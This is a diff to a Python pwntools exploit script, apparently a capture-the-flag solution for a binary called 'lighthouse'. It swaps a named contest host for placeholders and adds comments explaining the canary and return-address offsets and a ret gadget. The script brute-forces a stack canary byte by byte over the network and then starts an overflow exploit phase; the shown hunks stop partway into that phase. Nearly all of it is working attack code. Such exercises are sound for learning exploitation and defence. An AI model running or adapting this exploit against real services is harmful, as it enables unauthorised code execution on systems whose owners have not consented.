@@ -1,22 +1,26 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = ELF('lighthouse', checksec=False)
+exe = ELF("./lighthouse", checksec=False)
 context.binary = exe
-context.os     = 'linux'
 context.arch   = 'amd64'
+context.os     = 'linux'
 
-HOST, PORT = 'offsec.m0lecon.it', 13546
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
 
-OFFSET_TO_CANARY = 136
-OFFSET_TO_RIP    = 152
-GADGET           = 0x000000000040101a
+# ── offsets ───────────────────────────────────────────────────────────────────
+OFFSET_TO_CANARY = 136   # buf[128] + 8 bytes padding
+OFFSET_TO_RIP    = 152   # OFFSET_TO_CANARY + canary (8) + saved RBP (8)
+
+# ── gadgets ───────────────────────────────────────────────────────────────────
+GADGET = 0x000000000040101a   # ret — 16-byte stack alignment for system()
 
 def conn(interactive=False):
     level = 'info' if interactive else 'error'
     if args.LOCAL:
         return remote('127.0.0.1', 9001, level=level)
-    return remote(HOST, PORT, level=level)
+    return remote(HOSTNAME, PORT, level=level)
 
 def try_byte(known, bval):
     r = conn()
@@ -33,6 +37,7 @@ def try_byte(known, bval):
         return False
 
 def main():
+    # ── leak phase ────────────────────────────────────────────────────────────
     known = b'\x00'
     for i in range(7):
         p = log.progress(f'Bruteforcing byte {i+1}')
@@ -48,6 +53,7 @@ def main():
     canary = u64(known)
     log.success(f'canary = {canary:#x}')
 
+    # ── exploit phase ─────────────────────────────────────────────────────────
     r = conn(interactive=True)
     r.recvuntil(b'> ')
     r.sendline(b'1')
